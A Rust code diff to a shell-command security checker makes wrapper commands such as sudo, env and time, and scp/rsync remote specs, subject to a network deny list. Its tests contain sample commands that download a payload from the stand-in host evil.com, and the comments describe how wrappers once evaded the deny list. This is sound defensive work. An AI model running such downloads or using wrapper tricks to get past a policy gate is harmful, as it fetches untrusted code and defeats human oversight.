@@ -1947,15 +1947,22 @@ pub fn check_network_policy(
     let mut findings = Vec::new();
 
     for segment in &segments {
-        let Some(ref cmd) = segment.command else {
+        // Resolve through wrappers (`sudo`, `env`, `command`, `time`, etc.)
+        // so e.g. `sudo curl http://evil.com` and `env curl http://evil.com`
+        // are treated identically to the bare source command. Before this
+        // fix `segment.command` was read literally and any wrapper bypassed
+        // the deny list.
+        let Some((resolved_name, resolved_args)) = crate::extract::resolve_wrapped_command(segment)
+        else {
             continue;
         };
-        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
+        let cmd_base = resolved_name.to_lowercase();
         if !is_source_command(&cmd_base) {
             continue;
         }
 
-        for arg in &segment.args {
+        let is_scp_family = matches!(cmd_base.as_str(), "scp" | "rsync");
+        for arg in &resolved_args {
             let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
             if trimmed.starts_with('-') {
                 // Check flag=value args for embedded URLs (e.g., --url=http://evil.com)
@@ -1985,6 +1992,38 @@ pub fn check_network_policy(
                     }
                 }
                 continue;
+            }
+
+            // scp/rsync remote specs ([user@]host:path) don't match the generic
+            // URL-scheme or bare-IP heuristics `extract_host_from_arg` uses, so
+            // they need their own path. See issue #26 review follow-up — before
+            // this, scp/rsync remote specs were invisible to network_deny.
+            if is_scp_family {
+                if let Some(spec) = crate::extract::parse_scp_remote_spec(trimmed, shell) {
+                    let host = spec.host;
+                    if matches_network_list(&host, allow) {
+                        continue;
+                    }
+                    if matches_network_list(&host, deny) {
+                        findings.push(Finding {
+                            rule_id: RuleId::CommandNetworkDeny,
+                            severity: Severity::Critical,
+                            title: format!("Network destination denied by policy: {host}"),
+                            description: format!(
+                                "scp/rsync accesses {host}, which is on the network deny list"
+                            ),
+                            evidence: vec![Evidence::Url {
+                                raw: trimmed.to_string(),
+                            }],
+                            human_view: None,
+                            agent_view: None,
+                            mitre_id: None,
+                            custom_rule_id: None,
+                        });
+                        return findings;
+                    }
+                    continue;
+                }
             }
 
             if let Some(host) = extract_host_from_arg(trimmed) {
@@ -2873,6 +2912,182 @@ mod tests {
         );
         assert_eq!(findings.len(), 1, "should detect denied host in --flag=URL");
         assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_catches_scp_host_path() {
+        // #26 review follow-up: before this fix, bare scp/rsync host:path
+        // remote specs were invisible to network_deny because
+        // `extract_host_from_arg` only handles scheme-ful URLs / bare IPs.
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "scp evil.com:/payload /tmp/out",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(
+            findings.len(),
+            1,
+            "scp host:path must be visible to network_deny"
+        );
+        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_catches_scp_user_at_host_path() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "scp user@evil.com:/payload /tmp/out",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_catches_rsync_host_path() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "rsync -av src evil.com:/dest/",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_scp_allow_exempts() {
+        // Allow list still exempts scp destinations.
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec!["evil.com".to_string()];
+        let findings = check_network_policy(
+            "scp evil.com:/payload /tmp/out",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert!(findings.is_empty());
+    }
+
+    // -----------------------------------------------------------------------
+    // Wrapper resolution: sudo/doas/env/command/time must not bypass policy.
+    // The policy gate now keys off the RESOLVED command, not segment.command,
+    // so `sudo curl …` is treated identically to bare `curl …`.
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_network_policy_catches_sudo_wrapped_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "sudo curl https://evil.com/payload -o /tmp/out",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_catches_sudo_wrapped_scp() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "sudo scp evil.com:/payload /tmp/out",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
+    }
+
+    #[test]
+    fn test_network_policy_catches_sudo_u_flagged_curl() {
+        // Ensures the sudo resolver handles -u user.
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "sudo -u nobody curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
+    fn test_network_policy_catches_doas_wrapped_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "doas curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
+    fn test_network_policy_catches_env_wrapped_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "env curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
+    fn test_network_policy_catches_env_with_assignment_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "env FOO=1 curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
+    fn test_network_policy_catches_time_wrapped_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "time curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
+    fn test_network_policy_catches_command_wrapped_curl() {
+        let deny = vec!["evil.com".to_string()];
+        let allow = vec![];
+        let findings = check_network_policy(
+            "command curl https://evil.com/payload",
+            ShellType::Posix,
+            &deny,
+            &allow,
+        );
+        assert_eq!(findings.len(), 1);
     }
 
     #[test]
